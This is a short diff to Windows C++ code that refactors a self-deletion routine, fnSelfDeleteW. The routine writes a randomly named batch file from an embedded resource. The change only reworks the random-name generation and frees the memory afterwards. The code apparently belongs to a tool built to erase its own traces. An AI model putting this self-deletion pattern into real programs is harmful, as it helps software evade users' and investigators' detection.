@@ -141,7 +141,9 @@ BOOL fnDirectoryIteratorW(
 BOOL fnSelfDeleteW(VOID) {
 	DWORD dwBufferSize = NULL;
 	HANDLE hHeap = GetProcessHeap();
-	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";
+
+	LPCWSTR lpCGRS = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet);
+	std::wstring szBat = szCd + (std::wstring)lpCGRS + L".bat";
 
 	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA101, RT_RCDATA, &dwBufferSize);
 	if (lpBuffer) {
@@ -174,6 +176,7 @@ BOOL fnSelfDeleteW(VOID) {
 		}
 	}
 
+	delete[] lpCGRS;
 	return FALSE;
 }
 
